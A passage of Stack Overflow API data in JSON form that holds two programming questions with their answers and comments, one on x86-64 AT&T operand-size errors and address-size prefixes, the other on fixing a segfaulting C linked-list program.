"https://www.gravatar.com/avatar/21dd5fba1bcc49ae67d80a235959c0b8?s=128&d=identicon&r=PG&f=1", "display_name": "calebeja9", "link": "https://stackoverflow.com/users/7911562/calebeja9"}, "reply_to_user": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "edited": false, "score": 0, "creation_date": 1524610328, "post_id": 50011697, "comment_id": 87039937, "body": "@fuz not sure, but what about <code>movb $0xf, (%bx)</code> would this be correct as well if address size is overrided?"}, {"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "edited": false, "score": 1, "creation_date": 1524610691, "post_id": 50011697, "comment_id": 87040039, "body": "@calebeja9 No.  Address size can only be 32 bit or 64 bit in long mode."}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1617658448, "post_id": 50011697, "comment_id": 118360434, "body": "Is this from CS:APP 3rd edition, &quot;global&#39; version?  It&#39;s full of incorrect claims about x86-64 in the practice problems.  <a href=\"https://stackoverflow.com/q/57998998\">CS:APP example uses idivq with two operands?</a> has some info about the situation with that book, and the clueless people hired by the publisher who made up new problems without understanding x86-64."}], "answers": [{"comments": [{"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1524633931, "post_id": 50012962, "comment_id": 87045334, "body": "<code>movb $0xF, (%ebx)</code> assembles just fine (with a <code>0x67</code> address-size prefix), and executes correctly if the address in <code>ebx</code> is valid.  The only reason you&#39;d ever use that instead of <code>movb $0xF, (%rbx)</code> is if the upper bytes of <code>%rbx</code> potentially held garbage, e.g. <a href=\"https://en.wikipedia.org/wiki/X32_ABI\" rel=\"nofollow noreferrer\">in the x32 ABI (ILP32 in long mode)</a>, or if you&#39;re a dumb compiler that <a href=\"https://gcc.gnu.org/bugzilla/show_bug.cgi?id=85038\" rel=\"nofollow noreferrer\">always uses address-size prefixes when targeting 32-bit-pointer mode even when addresses are known to be safely zero-extended</a>.  So <code>gcc -mx32</code> could easily emit it."}], "tags": [], "owner": {"reputation": 6093, "user_id": 2189500, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/109f747845a9ce762a1fff72eb8cf6f3?s=128&d=identicon&r=PG", "display_name": "David Wohlferd", "link": "https://stackoverflow.com/users/2189500/david-wohlferd"}, "is_accepted": true, "score": 1, "last_activity_date": 1524621420, "creation_date": 1524621420, "answer_id": 50012962, "question_id": 50011697, "link": "https://stackoverflow.com/questions/50011697/data-movement-error-clarification/50012962#50012962", "title": "data movement error clarification", "body": "<pre><code>movb $0xF, (%ebx) gives an error because ebx can't be used as address register\n</code></pre>\n\n<p>It's true that <code>ebx</code> can't be used as an address register (for x86-64), but <code>rbx</code> can.  ebx is the lower 32bits of rbx.  The whole point of 64bit code is that addresses can be 64bits, so trying to reference memory by using a 32bit register makes little sense.</p>\n\n<pre><code>movl %rax, (%rsp) and movb %si, 8(%rbp) gives error saying that \ntheres a mismatch between instruction suffix and register I.D.\n</code></pre>\n\n<p>Yes, because you are using <code>movl</code>, the 'l' means long, which (in this context) means 32bits.  However, rax is a 64bit register.  If you want to write 64bits out of rax, you should use <code>movq</code>.  If you want to write 32bits, you should use <code>eax</code>.</p>\n\n<pre><code>movl %eax, %rdx gives an error saying that destination operand incorrect size\n</code></pre>\n\n<p>You are trying to move a 32bit value into a 64bit register.  There are instructions to do this conversion for you (see <code>cdq</code> for example), but movl isn't one of them.</p>\n"}, {"tags": [], "owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "is_accepted": false, "score": 0, "last_activity_date": 1524635520, "creation_date": 1524635520, "answer_id": 50014892, "question_id": 50011697, "link": "https://stackoverflow.com/questions/50011697/data-movement-error-clarification/50014892#50014892", "title": "data movement error clarification", "body": "<p><code>movb $0xF, (%ebx)</code> assembles just fine (with a <code>0x67</code> address-size prefix), and executes correctly if the address in <code>ebx</code> is valid.</p>\n\n<p>It might be a bug (and e.g. lead to a segfault from truncating a pointer), or sub-optimal, but if your book makes any stronger claim than that (like that it won't assemble) then your book contains an error.</p>\n\n<p>The only reason you'd ever use that instead of <code>movb $0xF, (%rbx)</code> is if the upper bytes of <code>%rbx</code> potentially held garbage, e.g. <a href=\"https://en.wikipedia.org/wiki/X32_ABI\" rel=\"nofollow noreferrer\">in the x32 ABI (ILP32 in long mode)</a>, or if you're a dumb compiler that <a href=\"https://gcc.gnu.org/bugzilla/show_bug.cgi?id=85038\" rel=\"nofollow noreferrer\">always uses address-size prefixes when targeting 32-bit-pointer mode even when addresses are known to be safely zero-extended</a>.</p>\n\n<p>32-bit address size is actually useful for the x32 ABI for the more common case where an index register holds high garbage, e.g. <code>movl $0x12345, (%edi, %esi,4)</code>.</p>\n\n<p><code>gcc -mx32</code> could easily emit a <code>movb $0xF, (%ebx)</code> instruction in real life.    (Note that <code>-mx32</code> (32-bit pointers in long mode) is different from <code>-m32</code> (i386 ABI))</p>\n\n<pre><code>int ext();          // can't inline\nvoid foo(char *p) { \n    ext();          // clobbers arg-passing registers\n    *p = 0xf;       // so gcc needs to save the arg for after the call\n}\n</code></pre>\n\n<p>Compiles with <a href=\"https://gcc.godbolt.org/#g:!((g:!((g:!((h:codeEditor,i:(j:1,lang:c%2B%2B,source:&#39;int+ext()%3B%0Avoid+foo(char+*p)+%7B+%0A++++ext()%3B%0A++++*p+%3D+0xf%3B%0A%7D&#39;),l:&#39;5&#39;,n:&#39;0&#39;,o:&#39;C%2B%2B+source+%231&#39;,t:&#39;0&#39;)),k:51.339829476248475,l:&#39;4&#39;,n:&#39;0&#39;,o:&#39;&#39;,s:0,t:&#39;0&#39;),(g:!((g:!((h:compiler,i:(compiler:g73,filters:(b:&#39;0&#39;,binary:&#39;1&#39;,commentOnly:&#39;0&#39;,demangle:&#39;0&#39;,directives:&#39;0&#39;,execute:&#39;1&#39;,intel:&#39;1&#39;,trim:&#39;1&#39;),lang:c%2B%2B,libs:!(),options:&#39;-std%3Dgnu%2B%2B11+-Wall+-O3+-mx32&#39;,source:1),l:&#39;5&#39;,n:&#39;0&#39;,o:&#39;x86-64+gcc+7.3+(Editor+%231,+Compiler+%231)+C%2B%2B&#39;,t:&#39;0&#39;)),k:50,l:&#39;4&#39;,m:50,n:&#39;0&#39;,o:&#39;&#39;,s:0,t:&#39;0&#39;),(g:!((h:output,i:(compiler:1,editor:1,wrap:&#39;1&#39;),l:&#39;5&#39;,n:&#39;0&#39;,o:&#39;%231+with+x86-64+gcc+7.3&#39;,t:&#39;0&#39;)),header:(),l:&#39;4&#39;,m:50,n:&#39;0&#39;,o:&#39;&#39;,s:0,t:&#39;0&#39;)),k:48.660170523751525,l:&#39;3&#39;,n:&#39;0&#39;,o:&#39;&#39;,t:&#39;0&#39;)),l:&#39;2&#39;,n:&#39;0&#39;,o:&#39;&#39;,t:&#39;0&#39;)),version:4\" rel=\"nofollow noreferrer\"><code>gcc7.3 -mx32 -O3</code> on the Godbolt compiler explorer</a> into</p>\n\n<pre><code>foo(char*):\n    pushq   %rbx              # rbx is gcc's first choice of call-preserved reg.\n    movq    %rdi, %rbx        # stupid gcc copies the whole 64 bits when only the low 32 are useful\n    call    ext()\n    movb    $15, (%ebx)       # $15 = $0xF\n    popq    %rbx\n    ret\n</code></pre>\n\n<p><code>mov $edi, %ebx</code> would have been better; IDK why gcc wants to copy the whole 64-bit register when it's treating pointers as 32-bit values.  The x32 ABI unfortunately never really caught on on x86 so I guess nobody's put in the time to get gcc to generate great code for it.</p>\n\n<p>AArch64 also has an ILP32 ABI to save memory / cache-footprint on pointer data, so maybe gcc will get better at 32-bit pointers in 64-bit mode in general (benefiting x86-64 as well) if any work for AArch64 ILP32 improves the common cross-architecture parts of this.</p>\n\n<hr>\n\n<blockquote>\n  <p>so if the line of code was movl %eax, %edx instead, the error wouldn't have occurred?</p>\n</blockquote>\n\n<p>Right, <a href=\"https://stackoverflow.com/questions/11177137/why-do-x86-64-instructions-on-32-bit-registers-zero-the-upper-part-of-the-full-6\">that would zero-extend EAX into RDX</a>.  If you wanted to <em>sign</em>-extend EAX into RDX, use <a href=\"https://stackoverflow.com/questions/6555094/what-does-cltq-do-in-assembly/45386217#45386217\"><code>movslq %eax, %rdx</code> (aka Intel-syntax <code>movsxd</code>)</a></p>\n\n<p>(Almost) all x86 instructions require all their operands to be the same size.  (In terms of operand-size; many instructions have a form with an 8-bit or 32-bit immediate that's sign extended to 64-bit or whatever the instruction's operand-size is.  e.g. <code>add $1, %eax</code> will use the 3-byte <a href=\"http://felixcloutier.com/x86/ADD.html\" rel=\"nofollow noreferrer\"><code>add imm8, r/m32</code> form</a>.)</p>\n\n<p>Exceptions include <code>shl %cl, %eax</code>, and movzx/movsx.</p>\n\n<p>In AT&amp;T syntax, the sizes of registers have to match the operand-size suffix, if you use one.  If you don't, the registers imply an operand-size.  e.g. <code>mov %eax, %edx</code> is the same as <code>movl</code>.</p>\n\n<p>Memory + immediate instructions with no register source or destination need an explicit size: <code>add $1, (%rdx)</code> won't assemble because the operand-size is ambiguous, but <code>add %eax, (%rdx)</code> is an <code>addl</code> (32-bit operand-size).</p>\n\n<blockquote>\n  <p><code>movew  %si, 8(%rbp)</code></p>\n</blockquote>\n\n<p>No, <code>movw %si, 8(%rbp)</code> would work though :P  But note that if you've made a traditional stack frame with <code>push %rbp</code> / <code>mov %rsp, %rbp</code> on function entry, that store to <code>8(%rbp)</code> will overwrite the low 16 bits of your return address on the stack.</p>\n\n<p>But there's no requirement in x86-64 code for Windows or Linux that you have <code>%rbp</code> pointing there, or holding a valid pointer at all.  It's just a call-preserved register like <code>%rbx</code> that you can use for whatever you want as long as you restore the caller's value before returning.</p>\n"}], "owner": {"reputation": 53, "user_id": 7911562, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/21dd5fba1bcc49ae67d80a235959c0b8?s=128&d=identicon&r=PG&f=1", "display_name": "calebeja9", "link": "https://stackoverflow.com/users/7911562/calebeja9"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1045, "favorite_count": 3, "accepted_answer_id": 50012962, "answer_count": 2, "score": 0, "last_activity_date": 1524635520, "creation_date": 1524609802, "question_id": 50011697, "link": "https://stackoverflow.com/questions/50011697/data-movement-error-clarification", "title": "data movement error clarification", "body": "<p>I'm currently solving problem 3.3 from 3rd edition of Computer System: a programmer's perspective and I'm having a hard time understanding what these errors mean...</p>\n\n<p><code>movb $0xF, (%ebx)</code> gives an error because ebx can't be used as address register</p>\n\n<p><code>movl %rax, (%rsp)</code> and \n   <code>movb %si, 8(%rbp)</code> gives error saying that theres a mismatch between instruction suffix and register I.D.</p>\n\n<p><code>movl %eax, %rdx</code> gives an error saying that destination operand incorrect size</p>\n\n<p>why can't we use ebx as address register? Is it because its 32-bit register? Would the following line work if it was <code>movb $0xF, (%rbx)</code> instead? since rbx is of 64bit register?</p>\n\n<p>for the error regarding mismatch between instruction suffix and register I.D, does this error appear because it should've been <code>movq %rax, (%rsp)</code>and <code>movew %si, 8(%rbp)</code> instead of <code>movl %rax, (%rsp)</code> and <code>movb %si, 8(%rbp)</code>?</p>\n\n<p>and lastly, for the error regarding \"destination operand incorrect size\", is this because the destination register was 64 bit instead of 32? so if the line of code was <code>movl %eax, %edx</code> instead, the error wouldn't have occurred? </p>\n\n<p>any enlightenment would be appreciated.</p>\n\n<p>this is for x86-64 </p>\n"}, {"tags": ["c", "linked-list", "malloc", "nodes", "free"], "comments": [{"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1524609179, "post_id": 50011528, "comment_id": 87039622, "body": "<i>&quot;creates nodes for head, tmp, content&quot;</i> Nope, creates pointers. You need to allocate memory for each of those using <code>malloc</code> before you use them. So for example, <code>head-&gt;next = content</code> is an instant segfault, because <code>head</code> is <code>NULL</code>."}, {"owner": {"reputation": 119, "user_id": 7217977, "user_type": "registered", "accept_rate": 20, "profile_image": "https://i.stack.imgur.com/sivLA.jpg?s=128&g=1", "display_name": "00Saad", "link": "https://stackoverflow.com/users/7217977/00saad"}, "reply_to_user": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1524610377, "post_id": 50011528, "comment_id": 87039953, "body": "I&#39;ll be honest with you, this code is based on pseudocode from a YouTube video. I understand what you&#39;re saying, and I think I get what was going on in that video, but what I&#39;m really confused about is the tmp part. So tmp needs to point to content, so the linked list doesn&#39;t get orphaned (is that correct)? So that&#39;s why tmp-&gt;next = content occurs, meaning it points to the content node. What I&#39;m not sure about is the whole tmp = tmp-&gt;next command. Is this saying tmp becomes the tmp pointer?"}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1524612830, "post_id": 50011528, "comment_id": 87040528, "body": "Imagine you have two nodes: A and B, and the <code>next</code> pointer in A points to B. If <code>tmp</code> points to A, then <code>tmp = tmp-&gt;next</code> will change <code>tmp</code> so that it points to B. But it doesn&#39;t do anything to A or B. Which is to say that in C, there&#39;s a difference between an <b>instance</b> of a <code>struct</code>, and a <b>pointer</b> to a <code>struct</code>. And if you&#39;ve confused yourself by watching bad YouTube videos, then you&#39;re going to need a good tutor to help you understand that distinction."}], "answers": [{"comments": [{"owner": {"reputation": 119, "user_id": 7217977, "user_type": "registered", "accept_rate": 20, "profile_image": "https://i.stack.imgur.com/sivLA.jpg?s=128&g=1", "display_name": "00Saad", "link": "https://stackoverflow.com/users/7217977/00saad"}, "edited": false, "score": 0, "creation_date": 1524610256, "post_id": 50011618, "comment_id": 87039912, "body": "How can I check if memory allocation succeeds?"}, {"owner": {"reputation": 262, "user_id": 4671911, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/f8ea67e9ae2150de4113dc3920ac86fc?s=128&d=identicon&r=PG&f=1", "display_name": "jess", "link": "https://stackoverflow.com/users/4671911/jess"}, "edited": false, "score": 0, "creation_date": 1524615497, "post_id": 50011618, "comment_id": 87041058, "body": "Check if the result of malloc returns a null pointer. <code>if((content = malloc(sizeof(node))) == NULL) { &#47;&#47; Handle error here }</code>"}], "tags": [], "owner": {"reputation": 262, "user_id": 4671911, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/f8ea67e9ae2150de4113dc3920ac86fc?s=128&d=identicon&r=PG&f=1", "display_name": "jess", "link": "https://stackoverflow.com/users/4671911/jess"}, "is_accepted": false, "score": 0, "last_activity_date": 1524609239, "creation_date": 1524609239, "answer_id": 50011618, "question_id": 50011528, "link": "https://stackoverflow.com/questions/50011528/simple-linked-list-program-just-isnt-working/50011618#50011618", "title": "Simple linked list program just isn&#39;t working", "body": "<p>The line <code>head-&gt;next = content; //head node points to content</code> doesn't make any sense. <code>head</code> doesn't point to anything (you assigned it null) and neither does content, so saying <code>head-&gt;next = content</code> is meaningless at this point. You need to assign memory to the head node before you start your loop or add a condition in the loop saying something like <code>if(head == NULL) head = content</code> after you assign memory to content. And check to make sure that your memory allocation succeeds.</p>\n"}, {"comments": [{"owner": {"reputation": 119, "user_id": 7217977, "user_type": "registered", "accept_rate": 20, "profile_image": "https://i.stack.imgur.com/sivLA.jpg?s=128&g=1", "display_name": "00Saad", "link": "https://stackoverflow.com/users/7217977/00saad"}, "edited": false, "score": 0, "creation_date": 1524623865, "post_id": 50012170, "comment_id": 87042826, "body": "So when I did node* head = NULL or node* (whatever) = NULL, without malloc(sizeof(node)), I didn&#39;t really create a node...is that correct? Some other program I copied, when I used <b>(node*)malloc(sizeof(node))</b> instead of <b>malloc(sizeof(node))</b>, it wouldn&#39;t compile."}, {"owner": {"reputation": 1551, "user_id": 806802, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/5kFde.jpg?s=128&g=1", "display_name": "Srini", "link": "https://stackoverflow.com/users/806802/srini"}, "reply_to_user": {"reputation": 119, "user_id": 7217977, "user_type": "registered", "accept_rate": 20, "profile_image": "https://i.stack.imgur.com/sivLA.jpg?s=128&g=1", "display_name": "00Saad", "link": "https://stackoverflow.com/users/7217977/00saad"}, "edited": false, "score": 0, "creation_date": 1524624455, "post_id": 50012170, "comment_id": 87042970, "body": "No. You did not create a node. You <i>declared</i> a pointer that is meant to point to chunks of memory whose spatial arrangement if that of a node, but right now point to <i>NULL</i>. If you got a compile time error when you typecast the <code>malloc</code> call, your error was probably elsewhere. without knowing what program you copied it is difficult to say. I compiled this program and can confirm it works."}, {"owner": {"reputation": 119, "user_id": 7217977, "user_type": "registered", "accept_rate": 20, "profile_image": "https://i.stack.imgur.com/sivLA.jpg?s=128&g=1", "display_name": "00Saad", "link": "https://stackoverflow.com/users/7217977/00saad"}, "edited": false, "score": 0, "creation_date": 1524668357, "post_id": 50012170, "comment_id": 87067040, "body": "One thing I&#39;m confused about is the <b>content = head</b>, <b>content = content-&gt;next</b>, or any other similar statements, since these are all pointers. Since these are pointers, they&#39;re not being assigned values, so does that mean they&#39;re now pointing to something else instead (besides NULL)?"}, {"owner": {"reputation": 1551, "user_id": 806802, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/5kFde.jpg?s=128&g=1", "display_name": "Srini", "link": "https://stackoverflow.com/users/806802/srini"}, "reply_to_user": {"reputation": 119, "user_id": 7217977, "user_type": "registered", "accept_rate": 20, "profile_image": "https://i.stack.imgur.com/sivLA.jpg?s=128&g=1", "display_name": "00Saad", "link": "https://stackoverflow.com/users/7217977/00saad"}, "edited": false, "score": 0, "creation_date": 1524673585, "post_id": 50012170, "comment_id": 87070469, "body": "Yes, they now point to whatever they&#39;re being assigned to. If the stuff on the left hand side of the <code>=</code> is a <code>malloc</code> then right hand side points to a new chunk of memory. If the left hand side is another pointer, then it points to whatever that pointer points to"}, {"owner": {"reputation": 119, "user_id": 7217977, "user_type": "registered", "accept_rate": 20, "profile_image": "https://i.stack.imgur.com/sivLA.jpg?s=128&g=1", "display_name": "00Saad", "link": "https://stackoverflow.com/users/7217977/00saad"}, "edited": false, "score": 0, "creation_date": 1524682047, "post_id": 50012170, "comment_id": 87074793, "body": "This is unrelated to my question, but has to do with pointers in general. I know that in some cases the <b>&amp;</b> is used with pointers. In what situations should that be used?"}, {"owner": {"reputation": 1551, "user_id": 806802, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/5kFde.jpg?s=128&g=1", "display_name": "Srini", "link": "https://stackoverflow.com/users/806802/srini"}, "reply_to_user": {"reputation": 119, "user_id": 7217977, "user_type": "registered", "accept_rate": 20, "profile_image": "https://i.stack.imgur.com/sivLA.jpg?s=128&g=1", "display_name": "00Saad", "link": "https://stackoverflow.com/users/7217977/00saad"}, "edited": false, "score": 0, "creation_date": 1524682144, "post_id": 50012170, "comment_id": 87074836, "body": "It&#39;s the <a href=\"https://www.hermetic.ch/cfunlib/ast_amp2.htm\" rel=\"nofollow noreferrer\">Address of</a> operator. The link has a lot more detail than I can go into in a comment"}, {"owner": {"reputation": 119, "user_id": 7217977, "user_type": "registered", "accept_rate": 20, "profile_image": "https://i.stack.imgur.com/sivLA.jpg?s=128&g=1", "display_name": "00Saad", "link": "https://stackoverflow.com/users/7217977/00saad"}, "edited": false, "score": 0, "creation_date": 1524683557, "post_id": 50012170, "comment_id": 87075602, "body": "So I copied your code verbatim, and it works, now I need to figure out how to do this my own way. Another question I have is this statement <b>content -&gt; next -&gt; value = i;</b>, I&#39;m not sure what it means."}, {"owner": {"reputation": 1551, "user_id": 806802, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/5kFde.jpg?s=128&g=1", "display_name": "Srini", "link": "https://stackoverflow.com/users/806802/srini"}, "reply_to_user": {"reputation": 119, "user_id": 7217977, "user_type": "registered", "accept_rate": 20, "profile_image": "https://i.stack.imgur.com/sivLA.jpg?s=128&g=1", "display_name": "00Saad", "link": "https://stackoverflow.com/users/7217977/00saad"}, "edited": false, "score": 0, "creation_date": 1524683624, "post_id": 50012170, "comment_id": 87075644, "body": "Let us <a href=\"https://chat.stackoverflow.com/rooms/169797/discussion-between-srini-and-00saad\">continue this discussion in chat</a>."}], "tags": [], "owner": {"reputation": 1551, "user_id": 806802, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/5kFde.jpg?s=128&g=1", "display_name": "Srini", "link": "https://stackoverflow.com/users/806802/srini"}, "is_accepted": true, "score": 0, "last_activity_date": 1524613782, "creation_date": 1524613782, "answer_id": 50012170, "question_id": 50011528, "link": "https://stackoverflow.com/questions/50011528/simple-linked-list-program-just-isnt-working/50012170#50012170", "title": "Simple linked list program just isn&#39;t working", "body": "<p>Ok, so let's break this down</p>\n\n<p>section by section</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(void) {\n    // Data section\n    typedef struct node {\n        int value;\n        struct node* next;\n    }\n    node;\n    node* head = NULL; // a pointer to what will be the head of the list\n    node* content; // a utility pointer\n    node* temp; // a utility pointer\n    int i; // iteration var\n\n    // Code Section\n    for (i = 1; i &lt;= 10; i++) {\n        if (head == NULL) {\n            // The list is empty when this condition triigers\n            // we initialize the first node and assign head to point to it\n            head = (node*)malloc(sizeof(node)); // allocate memory to the pointer. Also make sure the memory pointed to is of a node type\n                                                // This is important because it will allow us use -&gt; operator to assign values to the pointed\n                                                // at memory\n            head -&gt; value = i; // assign the value i to the value field of the pointed to memory\n            head -&gt; next = NULL; // assign the next pointer of the pointed to memory to NULL\n        } else {\n            // iterate over the list till we reach the end. \n            // Once we do, assign more memory at the end, assign the memory a value and make it's next pointer be NULL\n            content = head;\n            while (content -&gt; next != NULL) {\n                content = content -&gt; next;\n            }\n            content -&gt; next = (node*)malloc(sizeof(node));\n            content -&gt; next -&gt; value = i;\n        }\n\n    }\n\n    while (head != NULL) {\n        temp = head;\n        printf(\"Node data: %d\\n\", temp -&gt; value);\n        head = head-&gt;next;\n        free(temp);\n    }\n    return 0;\n}\n</code></pre>\n\n<h3>Data section</h3>\n\n<pre><code>// Data section\n    typedef struct node {\n        int value;\n        struct node* next;\n    }\n    node;\n    node* head = NULL; // a pointer to what will be the head of the list\n    node* content; // a utility pointer\n    node* temp; // a utility pointer\n    int i; // iteration var\n</code></pre>\n\n<p>When I learnt to program in C if you didn't declare the vars your function used upfront at the top of the function, the compiler would complain. For some reason it works now. </p>\n\n<p>When you declare something as a pointer, you are only declaring it. You cannot assign values to it before you allocate memory to the pointer.</p>\n\n<h3>Code Section (I don't know what else to call it)</h3>\n\n<pre><code>// Code Section\n    for (i = 1; i &lt;= 10; i++) {\n        if (head == NULL) {\n            // The list is empty when this condition triigers\n            // we initialize the first node and assign head to point to it\n            head = (node*)malloc(sizeof(node)); // allocate memory to the pointer. Also make sure the memory pointed to is of a node type\n                                                // This is important because it will allow us use -&gt; operator to assign values to the pointed\n                                                // at memory\n            head -&gt; value = i; // assign the value i to the value field of the pointed to memory\n            head -&gt; next = NULL; // assign the next pointer of the pointed to memory to NULL\n        } else {\n            // iterate over the list till we reach the end. \n            // Once we do, assign more memory at the end, assign the memory a value and make it's next pointer be NULL\n            content = head;\n            while (content -&gt; next != NULL) {\n                content = content -&gt; next;\n            }\n            content -&gt; next = (node*)malloc(sizeof(node));\n            content -&gt; next -&gt; value = i;\n        }\n\n    }\n</code></pre>\n\n<p>The right way to allocate memory and make sure the allocate memory is of a specific type is using <code>malloc</code> and cast it to the appropriate type. As you can see in some lines like <code>content -&gt; next = (node*)malloc(sizeof(node));</code>. Ensuring the type of the memory allocated is done with the typecast <code>(node*)</code></p>\n\n<p>What you were doing wrong</p>\n\n<ol>\n<li><code>head-&gt;next = content;</code> is wrong. <code>head</code> at the time of this statement in your code is <code>NULL</code>. It doesn't have a <code>next</code> pointer that you can point to anything.</li>\n<li><code>tmp-&gt;next = content;</code> same as above</li>\n<li><code>content = malloc(sizeof(node));</code> works best with the <em>typecast</em> I outlined above</li>\n<li>As others have pointed out, <code>malloc</code> can fail for a variety of reasons. It returns a <code>NULL</code> which you should check for.</li>\n<li>You never actually make <code>head</code> the head of your list</li>\n</ol>\n"}], "owner": {"reputation": 119, "user_id": 7217977, "user_type": "registered", "accept_rate": 20, "profile_image": "https://i.stack.imgur.com/sivLA.jpg?s=128&g=1", "display_name": "00Saad", "link": "https://stackoverflow.com/users/7217977/00saad"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 85, "favorite_count": 0, "accepted_answer_id": 50012170, "answer_count": 2, "score": 0, "last_activity_date": 1524613782, "creation_date": 1524608711, "last_edit_date": 1524611515, "question_id": 50011528, "link": "https://stackoverflow.com/questions/50011528/simple-linked-list-program-just-isnt-working", "title": "Simple linked list program just isn&#39;t working", "body": "<p>I'm just scratching the surface with nodes and linked lists, so I've been trying to create a linked lists that prints out nodes from 1-10. However, it's full of problems. The program gives me a runtime error and segmentation fault, I also have errors when running valgrind.</p>\n\n<p>The comments are more for me, to show that I (hopefully) know what each command is doing</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(void) {\n    typedef struct node {\n        int value;\n        struct node* next;\n    }\n    node;\n\n    //creates nodes for head, tmp, content\n    node* head = NULL;\n    node* tmp = NULL;\n    node* content = NULL;\n\n    head-&gt;next = content; //head node points to content\n\n    for (int i = 1; i &lt;= 10; i++) {\n        content = malloc(sizeof(node)); //creates new node\n        content-&gt;value = i; //node data becomes i\n        tmp-&gt;next = content; //tmp node points to content node\n        tmp = tmp-&gt;next; //tmp node becomes next content node\n        content-&gt;next = NULL; //content node points to null\n        printf(\"%i \", content-&gt;value); //see node value\n    }\n\n    while (head != NULL) {\n        node* temp = head;\n        head = head-&gt;next;\n        free(temp);\n    }\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "file-writing"], "comments": [{"owner": {"reputation": 109956, "user_id": 159145, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/r8ryC.png?s=128&g=1", "display_name": "Dai", "link": "https://stackoverflow.com/users/159145/dai"}, "edited": false, "score": 0, "creation_date": 1524608851, "post_id": 50011526, "comment_id": 87039544, "body": "Tried flushing your buffers?"}, {"owner": {"reputation": 11, "user_id": 9655610, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8aa10b656f450d01c057579d5e1d92bb?s=128&d=identicon&r=PG&f=1", "display_name": "Ian McMahon", "link": "https://stackoverflow.com/users/9655610/ian-mcmahon"}, "reply_to_user": {"reputation": 109956, "user_id": 159145, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/r8ryC.png?s=128&g=1", "display_name": "Dai", "link": "https://stackoverflow.com/users/159145/dai"}, "edited": false, "score": 0, "creation_date": 1524608944, "post_id": 50011526, "comment_id": 87039566, "body": "no i didn&#39;t, should I just do a fflush(file) for each line that is supposed to write to a file?"}, {"owner": {"reputation": 11, "user_id": 9655610, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8aa10b656f450d01c057579d5e1d92bb?s=128&d=identicon&r=PG&f=1", "display_name": "Ian McMahon", "link": "https://stackoverflow.com/users/9655610/ian-mcmahon"}, "reply_to_user": {"reputation": 109956, "user_id": 159145, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/r8ryC.png?s=128&g=1", "display_name": "Dai", "link": "https://stackoverflow.com/users/159145/dai"}, "edited": false, "score": 0, "creation_date": 1524609273, "post_id": 50011526, "comment_id": 87039648, "body": "@Dai did that, still doesn&#39;t work"}, {"owner": {"reputation": 3560, "user_id": 5550963, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7jAip.png?s=128&g=1", "display_name": "CEPB", "link": "https://stackoverflow.com/users/5550963/cepb"}, "edited": false, "score": 0, "creation_date": 1524619352, "post_id": 50011526, "comment_id": 87041873, "body": "Aren&#39;t you suppose to use &quot;\\&quot; in Windows?"}, {"owner": {"reputation": 11, "user_id": 9655610, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8aa10b656f450d01c057579d5e1d92bb?s=128&d=identicon&r=PG&f=1", "display_name": "Ian McMahon", "link": "https://stackoverflow.com/users/9655610/ian-mcmahon"}, "reply_to_user": {"reputation": 3560, "user_id": 5550963, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7jAip.png?s=128&g=1", "display_name": "CEPB", "link": 